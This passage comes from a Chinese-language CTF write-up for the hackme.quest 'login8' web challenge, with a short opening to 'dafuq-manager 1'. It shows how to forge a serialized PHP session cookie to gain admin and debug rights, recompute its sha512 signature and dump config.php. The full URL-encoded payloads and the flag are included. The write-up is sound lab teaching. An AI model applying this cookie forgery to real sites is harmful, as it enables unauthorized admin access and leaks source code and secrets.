</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 34</span><span>    &lt;<span style=color:#ff6ac1>link</span> <span style=color:#57c7ff>rel</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;stylesheet&#34;</span> <span style=color:#57c7ff>href</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;/bootstrap/css/bootstrap.min.css&#34;</span> <span style=color:#57c7ff>media</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;all&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 35</span><span>&lt;/<span style=color:#ff6ac1>head</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 36</span><span>&lt;<span style=color:#ff6ac1>body</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 37</span><span>    &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;jumbotron&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 38</span><span>        &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;container&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 39</span><span>            &lt;<span style=color:#ff6ac1>h1</span>&gt;Login as Admin 8&lt;/<span style=color:#ff6ac1>h1</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 40</span><span>        &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 41</span><span>    &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 42</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 43</span><span>    &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;container&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 44</span><span>        &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;navbar&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 45</span><span>            &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;container-fluid&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 46</span><span>                &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;navbar-header&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 47</span><span>                    &lt;<span style=color:#ff6ac1>a</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;navbar-brand&#34;</span> <span style=color:#57c7ff>href</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;/&#34;</span>&gt;Please Hack Me&lt;/<span style=color:#ff6ac1>a</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 48</span><span>                &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 49</span><span>                &lt;<span style=color:#ff6ac1>ul</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;nav navbar-nav&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 50</span><span>                    &lt;<span style=color:#ff6ac1>li</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 51</span><span>                        &lt;<span style=color:#ff6ac1>a</span> <span style=color:#57c7ff>href</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;/scoreboard&#34;</span>&gt;Scoreboard&lt;/<span style=color:#ff6ac1>a</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 52</span><span>                    &lt;/<span style=color:#ff6ac1>li</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 53</span><span>                    &lt;<span style=color:#ff6ac1>li</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 54</span><span>                        &lt;<span style=color:#ff6ac1>a</span> <span style=color:#57c7ff>href</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;?show_source=1&#34;</span> <span style=color:#57c7ff>target</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;_blank&#34;</span>&gt;Source Code&lt;/<span style=color:#ff6ac1>a</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 55</span><span>                    &lt;/<span style=color:#ff6ac1>li</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 56</span><span>                &lt;/<span style=color:#ff6ac1>ul</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 57</span><span>            &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 58</span><span>        &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 59</span><span>    &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 60</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 61</span><span>    &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;container&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 62</span><span>        &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;col-md-6 col-md-offset-3&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 63</span><span><span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>if</span>(<span style=color:#ff5c57>$login_failed</span>)<span style=color:#ff6ac1>:</span> <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 64</span><span><span style=color:#78787e>&lt;?php</span>     <span style=color:#ff6ac1>if</span>(<span style=color:#ff5c57>$_POST</span>[<span style=color:#5af78e>&#39;name&#39;</span>] <span style=color:#ff6ac1>===</span> <span style=color:#5af78e>&#39;admin&#39;</span>)<span style=color:#ff6ac1>:</span> <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 65</span><span>            &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;alert alert-danger&#34;</span>&gt;Nice try. Login failed&lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 66</span><span><span style=color:#78787e>&lt;?php</span>     <span style=color:#ff6ac1>else</span><span style=color:#ff6ac1>:</span> <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 67</span><span>            &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;alert alert-danger&#34;</span>&gt;Login failed&lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 68</span><span><span style=color:#78787e>&lt;?php</span>     <span style=color:#ff6ac1>endif</span>; <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 69</span><span><span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>elseif</span>(<span style=color:#ff5c57>$session</span><span style=color:#ff6ac1>-&gt;</span><span style=color:#57c7ff>is_admin</span>)<span style=color:#ff6ac1>:</span> <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 70</span><span>            &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;alert alert-success&#34;</span>&gt;Hello, admin! Here is your flag: &lt;<span style=color:#ff6ac1>code</span>&gt;<span style=color:#78787e>&lt;?</span><span style=color:#ff6ac1>=</span><span style=color:#ff5c57>$flag</span><span style=color:#78787e>?&gt;</span>&lt;/<span style=color:#ff6ac1>code</span>&gt;&lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 71</span><span><span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>elseif</span>(<span style=color:#ff5c57>$session</span><span style=color:#ff6ac1>-&gt;</span><span style=color:#57c7ff>user</span>)<span style=color:#ff6ac1>:</span> <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 72</span><span>            &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;alert alert-info&#34;</span>&gt;Hello, <span style=color:#78787e>&lt;?</span><span style=color:#ff6ac1>=</span><span style=color:#ff5c57>$session</span><span style=color:#ff6ac1>-&gt;</span><span style=color:#57c7ff>user</span><span style=color:#78787e>?&gt;</span>. You are not admin, no flag for you! :P&lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 73</span><span><span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>endif</span>; <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 74</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 75</span><span><span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>if</span>(<span style=color:#ff5c57>$session</span><span style=color:#ff6ac1>-&gt;</span><span style=color:#57c7ff>user</span>)<span style=color:#ff6ac1>:</span> <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 76</span><span>            &lt;<span style=color:#ff6ac1>form</span> <span style=color:#57c7ff>action</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;.&#34;</span> <span style=color:#57c7ff>method</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;POST&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 77</span><span>                &lt;<span style=color:#ff6ac1>input</span> <span style=color:#57c7ff>type</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;hidden&#34;</span> <span style=color:#57c7ff>name</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;logout&#34;</span> <span style=color:#57c7ff>value</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;true&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 78</span><span>                &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-group&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 79</span><span>                    &lt;<span style=color:#ff6ac1>input</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-control btn btn-danger&#34;</span> <span style=color:#57c7ff>type</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;submit&#34;</span> <span style=color:#57c7ff>value</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;Logout&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 80</span><span>                &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 81</span><span>            &lt;/<span style=color:#ff6ac1>form</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 82</span><span><span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>else</span><span style=color:#ff6ac1>:</span> <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 83</span><span>            &lt;<span style=color:#ff6ac1>form</span> <span style=color:#57c7ff>action</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;.&#34;</span> <span style=color:#57c7ff>method</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;POST&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 84</span><span>                &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-group&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 85</span><span>                    &lt;<span style=color:#ff6ac1>label</span> <span style=color:#57c7ff>for</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;name&#34;</span>&gt;User:&lt;/<span style=color:#ff6ac1>label</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 86</span><span>                    &lt;<span style=color:#ff6ac1>input</span> <span style=color:#57c7ff>id</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;name&#34;</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-control&#34;</span> <span style=color:#57c7ff>type</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;text&#34;</span> <span style=color:#57c7ff>name</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;name&#34;</span> <span style=color:#57c7ff>placeholder</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;User&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 87</span><span>                &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 88</span><span>                &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-group&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 89</span><span>                    &lt;<span style=color:#ff6ac1>label</span> <span style=color:#57c7ff>for</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;password&#34;</span>&gt;Pass:&lt;/<span style=color:#ff6ac1>label</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 90</span><span>                    &lt;<span style=color:#ff6ac1>input</span> <span style=color:#57c7ff>id</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;password&#34;</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-control&#34;</span> <span style=color:#57c7ff>type</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;text&#34;</span> <span style=color:#57c7ff>name</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;password&#34;</span> <span style=color:#57c7ff>placeholder</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;Password&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 91</span><span>                &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 92</span><span>                &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-group&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 93</span><span>                    &lt;<span style=color:#ff6ac1>input</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-control btn btn-primary&#34;</span> <span style=color:#57c7ff>type</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;submit&#34;</span> <span style=color:#57c7ff>value</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;Login&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 94</span><span>                &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 95</span><span>            &lt;/<span style=color:#ff6ac1>form</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 96</span><span><span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>endif</span>; <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 97</span><span>        &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 98</span><span>    &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 99</span><span>&lt;/<span style=color:#ff6ac1>body</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">100</span><span>&lt;/<span style=color:#ff6ac1>html</span>&gt;
</span></span></code></pre></div><p>會發現可以透過<code>$_GET['debug']===1</code>來啟用「<code>$session->debug()</code>」功能。<br>通常在做滲透測試時，如果拿到了系統 debug 工具的使用權限，那麼通常可以輕易獲得許多敏感資料。<br>先嘗試觸發看看<a href="https://ctf.hackme.quest/login8/?debug=1" target=_blank>https://ctf.hackme.quest/login8/?debug=1</a>：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/30/1_hu83e90940431eea124633ac0095373028_4229_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/30/1_hu83e90940431eea124633ac0095373028_4229_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/30/1_hu83e90940431eea124633ac0095373028_4229_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/30/1_hu83e90940431eea124633ac0095373028_4229_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/30/1_hu83e90940431eea124633ac0095373028_4229_660x0_resize_box_3.png alt style=width:100%></figure></p><p>看來沒那麼容易。</p><hr><p>未登入的<code>login8cookie</code>:</p><pre tabindex=0><code>O%3A7%3A%22Session%22%3A6%3A%7Bs%3A14%3A%22%00Session%00debug%22%3Bb%3A0%3Bs%3A19%3A%22%00Session%00debug_dump%22%3Bs%3A9%3A%22index.php%22%3Bs%3A13%3A%22%00Session%00data%22%3Ba%3A0%3A%7B%7Ds%3A4%3A%22user%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22pass%22%3Bs%3A0%3A%22%22%3Bs%3A8%3A%22is_admin%22%3Bb%3A0%3B%7D
</code></pre><p>URL decode 之後：</p><pre tabindex=0><code>O:7:&#34;Session&#34;:6:{s:14:&#34;Sessiondebug&#34;;b:0;s:19:&#34;Sessiondebug_dump&#34;;s:9:&#34;index.php&#34;;s:13:&#34;Sessiondata&#34;;a:0:{}s:4:&#34;user&#34;;s:0:&#34;&#34;;s:4:&#34;pass&#34;;s:0:&#34;&#34;;s:8:&#34;is_admin&#34;;b:0;}
</code></pre><p>sha512:</p><pre tabindex=0><code>4feb33685e47c83ce089b1707f270001a8dc0648d4a7d94d0a3e2f5b35803a7c8766285283415c8594e658468cf5e99be232b3bf98a441568a71f709243e9077
</code></pre><p>再仔細看看，會發現有一段長這樣：<code>s:14:".Session.debug";b:0;</code><br>得到管理員身份後，同時把這值改為<code>1</code>再嘗試一次(別忘了 sha512 也要改)</p><p><code>login8cookie</code>:</p><pre tabindex=0><code>O%3A7%3A%22Session%22%3A6%3A%7Bs%3A14%3A%22%00Session%00debug%22%3Bb%3A1%3Bs%3A19%3A%22%00Session%00debug_dump%22%3Bs%3A9%3A%22index.php%22%3Bs%3A13%3A%22%00Session%00data%22%3Ba%3A0%3A%7B%7Ds%3A4%3A%22user%22%3Bs%3A5%3A%22admin%22%3Bs%3A4%3A%22pass%22%3Bs%3A5%3A%22admin%22%3Bs%3A8%3A%22is_admin%22%3Bb%3A1%3B%7D
</code></pre><p>URL decode:</p><pre tabindex=0><code>O:7:&#34;Session&#34;:6:{s:14:&#34;Sessiondebug&#34;;b:1;s:19:&#34;Sessiondebug_dump&#34;;s:9:&#34;index.php&#34;;s:13:&#34;Sessiondata&#34;;a:0:{}s:4:&#34;user&#34;;s:5:&#34;admin&#34;;s:4:&#34;pass&#34;;s:5:&#34;admin&#34;;s:8:&#34;is_admin&#34;;b:1;}
</code></pre><p><code>login8sha512</code>:</p><pre tabindex=0><code>2ad02054b592c0e8f5ac53dd264901e74818821f54afe11694bc6782f14d1bd2d1eca947367affa0cdb3cb99e63737ead8300ac626b6f962eb5d7992ccc9de03
</code></pre><p>這時候可以得到<code>index.php</code>的原始碼：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/30/2_hu4ed2eec199b3f266f5ceee656f504ad0_93161_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/30/2_hu4ed2eec199b3f266f5ceee656f504ad0_93161_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/30/2_hu4ed2eec199b3f266f5ceee656f504ad0_93161_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/30/2_hu4ed2eec199b3f266f5ceee656f504ad0_93161_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/30/2_hu4ed2eec199b3f266f5ceee656f504ad0_93161_660x0_resize_box_3.png alt style=width:100%></figure></p><p>猜測<code>s:19:"Sessiondebug_dump";s:9:"index.php";</code>是用來選擇要 dump source code 的檔案，改成<code>config.php</code>試試，並且記得更改<code>byte</code>(<code>index.php</code>為<code>9</code>，<code>config.php</code>為<code>10</code>)。</p><p>就可以看到<code>config.php</code>的 source code 了</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/30/3_hu18280fe0eb3b013e65092b9f91cba2d3_50077_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/30/3_hu18280fe0eb3b013e65092b9f91cba2d3_50077_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/30/3_hu18280fe0eb3b013e65092b9f91cba2d3_50077_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/30/3_hu18280fe0eb3b013e65092b9f91cba2d3_50077_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/30/3_hu18280fe0eb3b013e65092b9f91cba2d3_50077_660x0_resize_box_3.png alt style=width:100%></figure></p><hr><p>Payload</p><pre tabindex=0><code>O%3A7%3A%22Session%22%3A6%3A%7Bs%3A14%3A%22%00Session%00debug%22%3Bb%3A1%3Bs%3A19%3A%22%00Session%00debug_dump%22%3Bs%3A10%3A%22config.php%22%3Bs%3A13%3A%22%00Session%00data%22%3Ba%3A0%3A%7B%7Ds%3A4%3A%22user%22%3Bs%3A5%3A%22admin%22%3Bs%3A4%3A%22pass%22%3Bs%3A5%3A%22admin%22%3Bs%3A8%3A%22is_admin%22%3Bb%3A1%3B%7D
</code></pre><pre tabindex=0><code>820cfbefb738a1646ca43ed05946f8b8e733435956528948270292c16ed9eca6752e0d0ffdde6eea4594c6b516eb41e364b9a801fa552dff3a68ec9ce98f6813
</code></pre><p>Flag <code>FLAG{wake up neo}</code></p><hr><h2 class="relative group">31. <a href=https://dafuq-manager.hackme.quest/ target=_blank>dafuq-manager 1</a><div id=31-dafuq-manager-1httpsdafuq-managerhackmequest class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#31-dafuq-manager-1httpsdafuq-managerhackmequest aria-label=定位點>#</a></span></h2><blockquote><p>Login as guest and find flag 1</p></blockquote><p>「<code>dafuq</code>」是網路用語，意思是「<code>WTF(what the fuck)</code>」，題目「<code>dafuq manager</code>」大致上意思是「<code>這管理者到底在幹麻！？</code>」。</p><p>這是一個登入頁面，先按照提示所說登入<code>guest</code>帳號：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/31/1_hue67b14591c13ee9950fb00351709bd3b_18556_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/31/1_hue67b14591c13ee9950fb00351709bd3b_18556_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/31/1_hue67b14591c13ee9950fb00351709bd3b_18556_1024x0_resize_box_3.png 1024w,
